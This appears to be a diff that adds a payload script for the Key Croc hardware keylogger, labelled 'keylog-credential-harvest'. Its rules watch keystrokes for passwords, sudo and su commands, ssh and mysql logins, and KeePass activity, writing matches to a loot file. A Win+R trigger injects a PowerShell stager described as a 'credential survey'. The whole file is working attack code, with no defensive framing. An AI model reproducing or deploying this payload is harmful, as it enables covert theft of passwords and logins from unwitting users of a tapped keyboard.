@@ -1,0 +1,62 @@
+# ================================================================
+#  Key Croc — keylog-credential-harvest
+#  Description : Multi-trigger credential harvesting payload.
+#                Triggers on:
+#                  1. Windows Run dialog (Win+R) — injects PS stager
+#                  2. Password/login patterns in keystream — logs them
+#                  3. Ctrl+Alt+Delete — captures timing (lock events)
+#                Keylog stream continuously scanned for credential
+#                patterns; matches written to /loot/keylog_hits.txt.
+#  Device      : Key Croc
+#  Author      : <operator>
+#  Deploy      : Copy to /payloads/ on Key Croc via USB (Arming Mode)
+#  Note        : Key Croc must be between keyboard and host.
+# ================================================================
+
+# ── Keylog pattern matching for credentials ────────────────────────
+# Match typed text containing "password" (case-insensitive)
+MATCH /[Pp]assword/
+    LED ATTACK
+    RUN /payloads/scripts/log_match.sh "PASSWORD_MATCH"
+END_MATCH
+
+# Match typed text containing "passwd" or "pass" in a field context
+MATCH /[Pp]ass(wd|word|phrase)/
+    LED ATTACK
+    RUN /payloads/scripts/log_match.sh "PASSPHRASE_MATCH"
+END_MATCH
+
+# Match common CLI credential patterns: su -, sudo, ssh user@, mysql -p
+MATCH /\bsu(do)? /
+    LED ATTACK
+    RUN /payloads/scripts/log_match.sh "SUDO_CMD"
+END_MATCH
+
+MATCH /ssh .+@/
+    LED ATTACK
+    RUN /payloads/scripts/log_match.sh "SSH_LOGIN"
+END_MATCH
+
+MATCH /mysql.*-p/
+    LED ATTACK
+    RUN /payloads/scripts/log_match.sh "MYSQL_LOGIN"
+END_MATCH
+
+# ── Win+R trigger: inject PS stager for credential survey ─────────
+MATCH [[Windows+r]]
+    LED ATTACK
+    DELAY 800
+    INJECT /payloads/injections/winr_ps_stager.txt
+END_MATCH
+
+# ── Ctrl+Alt+Delete: log lock/unlock events ───────────────────────
+MATCH [[ctrl+alt+delete]]
+    RUN /payloads/scripts/log_match.sh "CTRL_ALT_DEL"
+END_MATCH
+
+# ── App-level password field triggers ─────────────────────────────
+# KeePass master password entry pattern (long typed string after app focus)
+MATCH "KeePass"
+    LED ATTACK
+    RUN /payloads/scripts/log_match.sh "KEEPASS_FOCUS"
+END_MATCH
